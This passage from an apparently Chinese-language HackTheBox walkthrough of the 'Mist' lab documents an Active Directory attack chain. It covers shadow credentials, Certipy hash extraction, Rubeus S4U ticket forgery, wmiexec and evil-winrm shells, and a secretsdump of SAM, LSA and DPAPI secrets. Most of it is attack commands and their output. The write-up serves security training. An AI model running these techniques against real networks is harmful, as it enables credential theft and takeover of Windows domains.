class="line"></span><br><span class="line">Shadow credentials cleared successfully!</span><br><span class="line"></span><br><span class="line"><span class="comment"># set_shadow_creds MS01$</span></span><br><span class="line">Found Target DN: CN=MS01,CN=Computers,DC=mist,DC=htb</span><br><span class="line">Target SID: S-1-5-21-1045809509-3006658589-2426055941-1108</span><br><span class="line"></span><br><span class="line">KeyCredential generated with DeviceID: fa92c37f-7183-c4a3-f386-1accf1db62f2</span><br><span class="line">Shadow credentials successfully added!</span><br><span class="line">Saved PFX (<span class="comment">#PKCS12) certificate &amp; key at path: MjKHWVpJ.pfx</span></span><br><span class="line">Must be used with password: bELGL4DXebmGP91TSYgZ</span><br></pre></td></tr></table></figure>

<h3 id="Get-MS01-NTLM-Hash"><a href="#Get-MS01-NTLM-Hash" class="headerlink" title="Get MS01$ NTLM Hash"></a>Get MS01$ NTLM Hash</h3><p>这个shadow credential经常被重置，所以使用它来获取机器帐户的NTLM hash。使用<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2x5NGsvQ2VydGlweQ==">Certipy<i class="fa fa-external-link-alt"></i></span>制作一个无密码保护的版本：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">~/hackthebox/machine/mist certipy cert -<span class="built_in">export</span> -pfx pNxw0Isw.pfx -password 63VYxDTiyztHbwOQV63D -out ms01.pfx</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Writing PFX to <span class="string">&#x27;ms01.pfx&#x27;</span></span><br><span class="line"></span><br><span class="line">~/hackthebox/machine/mist proxychains -q certipy auth -pfx ms01.pfx -domain mist.htb -username MS01\$ -dc-ip 192.168.100.100 -ns 192.168.100.100</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[!] Could not find identification <span class="keyword">in</span> the provided certificate</span><br><span class="line">[*] Using principal: ms01<span class="variable">$@mist</span>.htb</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saved credential cache to <span class="string">&#x27;ms01.ccache&#x27;</span></span><br><span class="line">[*] Trying to retrieve NT <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;ms01$&#x27;</span></span><br><span class="line">[*] Got <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;ms01$@mist.htb&#x27;</span>: aad3b435b51404eeaad3b435b51404ee:25231b945c930613cd0a425c85901ad4</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mist % proxychains -q netexec smb MS01 -u <span class="string">&#x27;ms01$&#x27;</span> -H 25231b945c930613cd0a425c85901ad4</span><br><span class="line">SMB         192.168.100.101 445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:mist.htb) (signing:False) (SMBv1:False)</span><br><span class="line">SMB         192.168.100.101 445    MS01             [+] mist.htb\ms01$:25231b945c930613cd0a425c85901ad4</span><br></pre></td></tr></table></figure>

<p>这个hash将定期更改（默认情况下每24小时更改一次），并且每次启动时都会有所不同。</p>
<h1 id="Shell-as-Administrator-on-MS01"><a href="#Shell-as-Administrator-on-MS01" class="headerlink" title="Shell as Administrator on MS01"></a>Shell as Administrator on MS01</h1><h2 id="Get-Kerberos-Ticket"><a href="#Get-Kerberos-Ticket" class="headerlink" title="Get Kerberos Ticket"></a>Get Kerberos Ticket</h2><p>我不能使用这个机器帐户的NTLM hash（或影子凭证）进行任何远程登录。但是，作为SMB（CIFS）服务的管理员，可以使用这个hash来获取服务票据。</p>
<p>Brandon.Keywarp的shell，使用rubeus获得一个Kerberos票据作为机器帐户：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">PS C:\xampp\htdocs\files&gt; .\rubeus asktgt /nowrap /user:<span class="string">&quot;ms01$&quot;</span> /rc4:25231b945c930613cd0a425c85901ad4</span><br><span class="line"></span><br><span class="line">   ______        _</span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.3.2</span><br><span class="line"></span><br><span class="line">[*] Action: Ask TGT</span><br><span class="line"></span><br><span class="line">[*] Got domain: mist.htb</span><br><span class="line">[*] Using rc4_hmac <span class="built_in">hash</span>: 25231b945c930613cd0a425c85901ad4</span><br><span class="line">[*] Building AS-REQ (w/ preauth) <span class="keyword">for</span>: <span class="string">&#x27;mist.htb\ms01$&#x27;</span></span><br><span class="line">[*] Using domain controller: 192.168.100.100:88</span><br><span class="line">[+] TGT request successful!</span><br><span class="line">[*] <span class="built_in">base64</span>(ticket.kirbi):</span><br><span class="line"></span><br><span class="line">      doIFLDCCBSigAwIBBaEDAgEWooIEUDCCBExhggRIMIIERKADAgEFoQobCE1JU1QuSFRCoh0wG6ADAgECoRQwEhsGa3JidGd0GwhtaXN0Lmh0YqOCBBAwggQMoAMCARKhAwIBAqKCA/4EggP6R+/Me9FSGGcBqMVPHOscpAfymkhO55xWQEYCImqAnnKhV0DUHith5D/6P5uXDhUtnVBqYbQg4uG2B4rNhZuGFlTk9iLlA8pgTvfGPZTKbZQcbqO8kA8P0zvT441FzrdjRPPMKj82jwuPZACf1UoC4rRagNqOYvS7rfELwpUhNTJmIXnYLrj9QklEyaq/1Wd0U3dYNvzoN9Q5thu8b+aTiPfduMUjR4iEggZ5OcGUxPXlTYm53Hf01/aLGisIs7qXhENdEUGf+NYQj/8HOJ2Kd1efYSLHF+NaUoVttpDmzZldrzfzLsHisZCX8VHTa1kgNmJplnZe/Ta00H8lSdcRK630rFjB0L5b22zg91FMBtOSeMXxlpAWOjH5L9pi33mtdwuUzPsjbcdlSxk+TJ/dAeLe4Z4k6WromkJ38Kx3DbQfQewDQVVqB9TqCAzraEpsqIJ8aQhIZB6Ryz+92gi74m0ByuxXChxL26cky84YxGvcoT89hWjx/xiVeMBQ14+zSOlEpVpoem7WyzmdT8ShakWknm2hTDagHnQVY2gQb6578VBtodHgnP6/i8/aTvQZOlqVLM0IuoaAZ0Q+vk9ld416rWi/LQ+dSpslrbtSw/W/RDiqqqIqtCfin3i/E9xLZ1BkvfZloT8egxG83nQRDON17Zk94OaWY7yr3XaAuBK5e794c1xk+rC6SNGVVmWVEaWiVjId7LCKVHNFNUcUtgeU23wuNHyJL2iIsPbsW3RF7aqnqNXwAGaG17nJJ24dinu1J3Rumw5iYKeviYuzqN8Efrnbis5tTKFw0h0lc0EngT52A9PtOO5c5+wAG9C3pXqqlUNchf1qIPzqnrnsKn/tS1+lNISCpnrpG250XTe6PJ1zYFAzxLiHTgW/fzRobkP6wdNey6kdmylBsHGX1bnFO133Xo2oW8afCaijNk+EOBuJ+ErjM6QJxfyphyxzlBLR/rUqqxUMMzzJx7r4ymbVQUVE4TvGmLHB9Zfa/eVWQbADaxmzRNPbM08U+6MTgTDo6+lLbEt4BQCmhFwHoS2NMu9tfEn+7xegOwsmp4LdciwRAjOjH9mpypg6aDUbvaOuSD08sQsTFJtqqinnKlciYIlK1+JgYukMSyppbdkKm2bIV5WJzL4rt6P7bhDdB6I/RPI8CcDvpwBPmNrasLx0cJgveGLHMqT3TttEj+xg9oDNkfrysQAiuxML+ql+wbBQqERvcrVVwbabRrOgBr8LC8bUCK5FngM3IKl4jpLGwq2o9dIE/DtBF1wxwhjkRvI78K3JgsqV+kgwKkciYdJmIPTV7iSO4NkZbshorWUojIaGNqbhHw+IdTGnRwsLmn8s0Dc7rRGKuKOBxzCBxKADAgEAooG8BIG5fYG2MIGzoIGwMIGtMIGqoBswGaADAgEXoRIEEIw2NcvqHsZgRgLdfukFtcmhChsITUlTVC5IVEKiEjAQoAMCAQGhCTAHGwVtczAxJKMHAwUAQOEAAKURGA8yMDI0MTAyNzA3MTgxMFqmERgPMjAyNDEwMjcxNzE4MTBapxEYDzIwMjQxMTAzMDcxODEwWqgKGwhNSVNULkhUQqkdMBugAwIBAqEUMBIbBmtyYnRndBsIbWlzdC5odGI=</span><br><span class="line"></span><br><span class="line">  ServiceName              :  krbtgt/mist.htb</span><br><span class="line">  ServiceRealm             :  MIST.HTB</span><br><span class="line">  UserName                 :  ms01$ (NT_PRINCIPAL)</span><br><span class="line">  UserRealm                :  MIST.HTB</span><br><span class="line">  StartTime                :  10/27/2024 12:18:10 AM</span><br><span class="line">  EndTime                  :  10/27/2024 10:18:10 AM</span><br><span class="line">  RenewTill                :  11/3/2024 12:18:10 AM</span><br><span class="line">  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable</span><br><span class="line">  KeyType                  :  rc4_hmac</span><br><span class="line">  Base64(key)              :  jDY1y+oexmBGAt1+6QW1yQ==</span><br><span class="line">  ASREP (key)              :  25231B945C930613CD0A425C85901AD4</span><br></pre></td></tr></table></figure>

<p>把该票据返回给rubeus，使用s4u冒充MS01上的CIFS服务的管理员帐户请求票据：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">PS C:\xampp\htdocs\files&gt; .\rubeus s4u /self /nowrap /impersonateuser:Administrator /altservice:<span class="string">&quot;cisf/ms01.mist.htb&quot;</span> /ticket:doIFLDCCBSigAwIBBaEDAgEWooIEUDCCBExhggRIMIIERKADAgEFoQobCE1JU1QuSFRCoh0wG6ADAgECoRQwEhsGa3JidGd0GwhtaXN0Lmh0YqOCBBAwggQMoAMCARKhAwIBAqKCA/4EggP6R+/Me9FSGGcBqMVPHOscpAfymkhO55xWQEYCImqAnnKhV0DUHith5D/6P5uXDhUtnVBqYbQg4uG2B4rNhZuGFlTk9iLlA8pgTvfGPZTKbZQcbqO8kA8P0zvT441FzrdjRPPMKj82jwuPZACf1UoC4rRagNqOYvS7rfELwpUhNTJmIXnYLrj9QklEyaq/1Wd0U3dYNvzoN9Q5thu8b+aTiPfduMUjR4iEggZ5OcGUxPXlTYm53Hf01/aLGisIs7qXhENdEUGf+NYQj/8HOJ2Kd1efYSLHF+NaUoVttpDmzZldrzfzLsHisZCX8VHTa1kgNmJplnZe/Ta00H8lSdcRK630rFjB0L5b22zg91FMBtOSeMXxlpAWOjH5L9pi33mtdwuUzPsjbcdlSxk+TJ/dAeLe4Z4k6WromkJ38Kx3DbQfQewDQVVqB9TqCAzraEpsqIJ8aQhIZB6Ryz+92gi74m0ByuxXChxL26cky84YxGvcoT89hWjx/xiVeMBQ14+zSOlEpVpoem7WyzmdT8ShakWknm2hTDagHnQVY2gQb6578VBtodHgnP6/i8/aTvQZOlqVLM0IuoaAZ0Q+vk9ld416rWi/LQ+dSpslrbtSw/W/RDiqqqIqtCfin3i/E9xLZ1BkvfZloT8egxG83nQRDON17Zk94OaWY7yr3XaAuBK5e794c1xk+rC6SNGVVmWVEaWiVjId7LCKVHNFNUcUtgeU23wuNHyJL2iIsPbsW3RF7aqnqNXwAGaG17nJJ24dinu1J3Rumw5iYKeviYuzqN8Efrnbis5tTKFw0h0lc0EngT52A9PtOO5c5+wAG9C3pXqqlUNchf1qIPzqnrnsKn/tS1+lNISCpnrpG250XTe6PJ1zYFAzxLiHTgW/fzRobkP6wdNey6kdmylBsHGX1bnFO133Xo2oW8afCaijNk+EOBuJ+ErjM6QJxfyphyxzlBLR/rUqqxUMMzzJx7r4ymbVQUVE4TvGmLHB9Zfa/eVWQbADaxmzRNPbM08U+6MTgTDo6+lLbEt4BQCmhFwHoS2NMu9tfEn+7xegOwsmp4LdciwRAjOjH9mpypg6aDUbvaOuSD08sQsTFJtqqinnKlciYIlK1+JgYukMSyppbdkKm2bIV5WJzL4rt6P7bhDdB6I/RPI8CcDvpwBPmNrasLx0cJgveGLHMqT3TttEj+xg9oDNkfrysQAiuxML+ql+wbBQqERvcrVVwbabRrOgBr8LC8bUCK5FngM3IKl4jpLGwq2o9dIE/DtBF1wxwhjkRvI78K3JgsqV+kgwKkciYdJmIPTV7iSO4NkZbshorWUojIaGNqbhHw+IdTGnRwsLmn8s0Dc7rRGKuKOBxzCBxKADAgEAooG8BIG5fYG2MIGzoIGwMIGtMIGqoBswGaADAgEXoRIEEIw2NcvqHsZgRgLdfukFtcmhChsITUlTVC5IVEKiEjAQoAMCAQGhCTAHGwVtczAxJKMHAwUAQOEAAKURGA8yMDI0MTAyNzA3MTgxMFqmERgPMjAyNDEwMjcxNzE4MTBapxEYDzIwMjQxMTAzMDcxODEwWqgKGwhNSVNULkhUQqkdMBugAwIBAqEUMBIbBmtyYnRndBsIbWlzdC5odGI=</span><br><span class="line"></span><br><span class="line">   ______        _</span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.3.2</span><br><span class="line"></span><br><span class="line">[*] Action: S4U</span><br><span class="line"></span><br><span class="line">[*] Action: S4U</span><br><span class="line"></span><br><span class="line">[*] Building S4U2self request <span class="keyword">for</span>: <span class="string">&#x27;ms01$@MIST.HTB&#x27;</span></span><br><span class="line">[*] Using domain controller: DC01.mist.htb (192.168.100.100)</span><br><span class="line">[*] Sending S4U2self request to 192.168.100.100:88</span><br><span class="line">[+] S4U2self success!</span><br><span class="line">[*] Substituting alternative service name <span class="string">&#x27;cisf/ms01.mist.htb&#x27;</span></span><br><span class="line">[*] Got a TGS <span class="keyword">for</span> <span class="string">&#x27;Administrator&#x27;</span> to <span class="string">&#x27;cisf@MIST.HTB&#x27;</span></span><br><span class="line">[*] <span class="built_in">base64</span>(ticket.kirbi):</span><br><span class="line"></span><br><span class="line">      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</span><br></pre></td></tr></table></figure>

<p>要在Linux主机上使用这个票据，需要对它进行转换。将把base64字符串保存到一个文件中，并对其进行解码。然后使用ticketConverter.py（来自<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1NlY3VyZUF1dGhDb3JwL2ltcGFja2V0">Impacket<i class="fa fa-external-link-alt"></i></span>）将其转换为CCACHE格式：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/hackthebox/machine/mist</span><br><span class="line">&gt; <span class="built_in">base64</span> -d administrator.kirbi.b64 &gt; administrator.kirbi</span><br><span class="line">root@kali:~/hackthebox/machine/mist</span><br><span class="line">&gt; ticketConverter.py administrator.kirbi administrator.ccache</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] converting kirbi to ccache...</span><br><span class="line">[+] <span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/hackthebox/machine/mist</span><br><span class="line">&gt; KRB5CCNAME=administrator.ccache proxychains -q wmiexec.py administrator@ms01.mist.htb -k -no-pass</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] SMBv3.0 dialect used</span><br><span class="line">[!] Launching semi-interactive shell - Careful what you execute</span><br><span class="line">[!] Press <span class="built_in">help</span> <span class="keyword">for</span> extra shell commands</span><br><span class="line">C:\&gt;<span class="built_in">whoami</span></span><br><span class="line">mist\administrator</span><br><span class="line"></span><br><span class="line">C:\&gt;<span class="built_in">cd</span> C:\<span class="built_in">users</span>\administrator\desktop</span><br><span class="line">C:\<span class="built_in">users</span>\administrator\desktop&gt;<span class="built_in">type</span> user.txt</span><br><span class="line">4806854ad731db81dfdc5cb13d138120</span><br></pre></td></tr></table></figure>

<h2 id="secretsdump"><a href="#secretsdump" class="headerlink" title="secretsdump"></a>secretsdump</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">mist % KRB5CCNAME=administrator.ccache proxychains -q secretsdump.py administrator@ms01.mist.htb -k -no-pass</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] Service RemoteRegistry is <span class="keyword">in</span> stopped state</span><br><span class="line">[*] Starting service RemoteRegistry</span><br><span class="line">[*] Target system bootKey: 0xe3a142f26a6e42446aa8a55e39cbcd86</span><br><span class="line">[*] Dumping <span class="built_in">local</span> SAM hashes (uid:rid:lmhash:nthash)</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:711e6a685af1c31c4029c3c7681dd97b:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:90f903787dd064cc1973c3aa4ca4a7c1:::</span><br><span class="line">svc_web:1000:aad3b435b51404eeaad3b435b51404ee:76a99f03b1d2656e04c39b46e16b48c8:::</span><br><span class="line">[*] Dumping cached domain logon information (domain/username:<span class="built_in">hash</span>)</span><br><span class="line">MIST.HTB/Brandon.Keywarp:$DCC2<span class="variable">$10240</span><span class="comment">#Brandon.Keywarp#5f540c9ee8e4bfb80e3c732ff3e12b28: (2024-10-27 07:30:58)</span></span><br><span class="line">[*] Dumping LSA Secrets</span><br><span class="line">[*] <span class="variable">$MACHINE</span>.ACC</span><br><span class="line">MIST\MS01$:plain_password_hex:7e580d1b9c3b6f6e86642fe757cd0b8d0b99cc99cc7b44ab5a0090f0d9df6e6aed5bcf0209b662941352c2fa84f9c67c888f82bce891c1e4c12c9dd3ba3c69dccb34e2c1ccebd6f54f5f3eae7a6ec0461c2fe65ee2aaeb42333cc339ef2f5def6a1da74eda6e6a0e58446d0ea0786186045c63fd0edb40a76f8c29ea76f987f28cd64611a3dad4bbd3926472e107d16d2c2cbe0ece843c377896901916e7289c71d06f48de21f840ec14d193176068dad898e0b133998814bbd2852e026d3ae9e313ba4bd36e6f937e7d17c7671ebf939803d439f9a908d90c3336e097c96020aafd2cfb3c93617c74e361d5942976cf</span><br><span class="line">MIST\MS01$:aad3b435b51404eeaad3b435b51404ee:25231b945c930613cd0a425c85901ad4:::</span><br><span class="line">[*] DPAPI_SYSTEM</span><br><span class="line">dpapi_machinekey:0xe464e18478cf4a7d809dfc9f5d6b5230ce98779b</span><br><span class="line">dpapi_userkey:0x579d7a06798911d322fedc960313e93a71b43cc2</span><br><span class="line">[*] NL<span class="variable">$KM</span></span><br><span class="line"> 0000   57 C8 F7 CD 24 F2 55 EB  19 1D 07 C2 15 84 21 B0   W...$.U.......!.</span><br><span class="line"> 0010   90 7C 79 3C D5 BE CF AC  EF 40 4F 8E 2A 76 3F 00   .|y&lt;.....@O.*v?.</span><br><span class="line"> 0020   04 87 DF 47 CF D8 B7 AF  6D 5E EE 9F 16 5E 75 F3   ...G....m^...^u.</span><br><span class="line"> 0030   80 24 AA 24 B0 7D 3C 29  4F EA 4E 4A FB 26 4E 62   .$.$.&#125;&lt;)O.NJ.&amp;Nb</span><br><span class="line">NL<span class="variable">$KM</span>:57c8f7cd24f255eb191d07c2158421b0907c793cd5becfacef404f8e2a763f000487df47cfd8b7af6d5eee9f165e75f38024aa24b07d3c294fea4e4afb264e62</span><br><span class="line">[*] _SC_ApacheHTTPServer</span><br><span class="line">svc_web:MostSavagePasswordEver123</span><br><span class="line">[*] Cleaning up...</span><br><span class="line">[*] Stopping service RemoteRegistry</span><br></pre></td></tr></table></figure>

<p>可以直接以管理员的身份获得shell，而无需返回到其他步骤：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/hackthebox/machine/mist</span><br><span class="line">&gt; proxychains -q evil-winrm -i localhost -u administrator -H 711e6a685af1c31c4029c3c7681dd97b</span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v3.5</span><br><span class="line"></span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine</span><br><span class="line"></span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion</span></span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; <span class="built_in">whoami</span></span><br><span class="line">ms01\administrator</span><br></pre></td></tr></table></figure>

<h1 id="Shell-as-op-Sharon-Mullard-on-Mist"><a href="#Shell-as-op-Sharon-Mullard-on-Mist" class="headerlink" title="Shell as op_Sharon.Mullard on Mist"></a>Shell as op_Sharon.Mullard on Mist</h1><h2 id="Enumeration-2"><a href="#Enumeration-2" class="headerlink" title="Enumeration"></a>Enumeration</h2><h3 id="Home-Directories"><a href="#Home-Directories" class="headerlink" title="Home Directories"></a>Home Directories</h3><p>Sharon.Mullard有一个KeePass数据库，在他们的主目录中也有一些图像：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\Sharon.Mullard&gt; tree . /f</span><br><span class="line">Folder PATH listing</span><br><span class="line">Volume serial number is 000001AF 560D:8100</span><br><span class="line">C:\USERS\SHARON.MULLARD</span><br><span class="line">+---Desktop</span><br><span class="line">+---Documents</span><br><span class="line">¦       sharon.kdbx</span><br><span class="line">¦</span><br><span class="line">+---Downloads</span><br><span class="line">+---Favorites</span><br><span class="line">+---Links</span><br><span class="line">+---Music</span><br><span class="line">+---Pictures</span><br><span class="line">¦       cats.png</span><br><span class="line">¦       image_20022024.png</span><br><span class="line">¦</span><br><span class="line">+---Saved Games</span><br><span class="line">+---Videos</span><br></pre></td></tr></table></figure>

<h3 id="KeePass"><a href="#KeePass" class="headerlink" title="KeePass"></a>KeePass</h3><p>KeePass数据库需要密码，看看两个图片文件</p>
<ul>
<li><p>cats.png</p>
</li>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mist-cats.png"></p>
</li>
<li><p>image_20022024.png</p>
</li>
